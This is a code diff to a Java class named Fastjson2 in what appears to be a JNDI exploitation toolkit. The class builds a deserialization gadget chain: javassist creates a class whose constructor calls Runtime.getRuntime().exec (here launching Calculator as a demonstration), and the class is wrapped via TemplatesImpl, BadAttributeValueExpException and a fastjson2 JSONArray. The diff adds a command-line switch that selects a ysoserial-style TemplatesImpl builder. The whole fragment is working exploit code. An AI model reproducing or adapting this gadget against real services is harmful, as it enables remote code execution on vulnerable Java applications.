@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.alibaba.fastjson2.JSONArray;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -10,6 +11,8 @@ import javassist.CtConstructor;
 
 import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.Field;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 public class Fastjson2 implements ObjectPayload<Object> {
     @Override
@@ -21,7 +24,12 @@ public class Fastjson2 implements ObjectPayload<Object> {
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
         constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
         clazz.addConstructor(constructor);
-        Object templates = Gadgets.createTemplatesImpl(type,param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
 
 
         JSONArray jsonArray = new JSONArray();
